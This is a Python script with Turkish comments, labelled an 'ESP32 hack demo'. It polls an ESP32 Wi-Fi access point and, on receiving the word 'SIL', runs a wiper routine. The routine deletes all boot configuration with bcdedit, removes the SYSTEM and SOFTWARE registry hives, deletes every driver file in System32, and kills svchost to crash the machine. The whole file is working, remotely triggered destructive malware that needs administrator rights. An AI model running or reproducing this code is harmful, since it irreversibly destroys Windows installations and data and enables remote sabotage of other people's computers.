import requests
import os
import time
import ctypes

# ============================================================
# AYARLAR
# ============================================================
# ESP32 AP modunda varsayılan IP genelde 192.168.4.1'dir
ESP32_IP  = "192.168.4.1"            
ESP32_URL = f"http://{ESP32_IP}/durum"

KONTROL_ARALIGI = 1
# ============================================================

def tam_imha():
    print("\n" + "!"*50)
    print("SİNYAL ALINDI: SİSTEM İMHA EDİLİYOR...")
    print("!"*50)
    
    # 1. Boot Verilerini Sil (BCD) - Açılışta "İşletim Sistemi Bulunamadı" hatası verdirir.
    print("[*] Boot konfigürasyonu yok ediliyor...")
    os.system("bcdedit /deleteall")
    
    # 2. Kayıt Defterini (Registry) Sil - Windows'un beynini temizler.
    print("[*] Kayıt defteri anahtarları siliniyor...")
    os.system(r'reg delete "HKEY_LOCAL_MACHINE\SYSTEM" /f')
    os.system(r'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE" /f')
    
    # 3. Kritik Sürücüleri Temizle
    print("[*] Sistem sürücüleri (drivers) siliniyor...")
    os.system(r"del /f /s /q C:\Windows\System32\drivers\*.sys")

    # 4. Final: Sistemi Çökert ve Kapat
    print("[*] Kritik süreç sonlandırılıyor...")
    # Bu komut yönetici haklarıyla svchost'u öldürür ve BSOD (Mavi Ekran) tetikler.
    os.system("taskkill /f /im svchost.exe")

def main():
    # WinError 5 almamak için yönetici kontrolü
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("=" * 50)
        print("[HATA] BU KODU LÜTFEN 'YÖNETİCİ OLARAK' ÇALIŞTIR!")
        print("=" * 50)
        return

    print("=" * 50)
    print("  ESP32 HACK DEMO — AP MOD (WIFI) İMHA DİNLEYİCİ")
    print("=" * 50)
    print(f"ESP32 Hedef : {ESP32_URL}")
    print("[İPUCU] Bilgisayarın HACK_DEMO ağına bağlı olduğundan emin ol.")
    print("\n[HAZIR] Sinyal bekleniyor... Sistem şu an güvende.\n")

    while True:
        try:
            response = requests.get(ESP32_URL, timeout=2)
            durum = response.text.strip().upper()

            if durum == "SIL":
                tam_imha()
                break
            else:
                print(f"[...] Dinleniyor... ESP32 Yanıtı: '{durum}'", end="\r")

        except requests.exceptions.ConnectionError:
            print("[!] ESP32'ye bağlanılamıyor — Wi-Fi bağlantısını kontrol et!", end="\r")
        except Exception as e:
            print(f"[!] Hata oluştu: {e}                                     ", end="\r")

        time.sleep(KONTROL_ARALIGI)

if __name__ == "__main__":
    main()
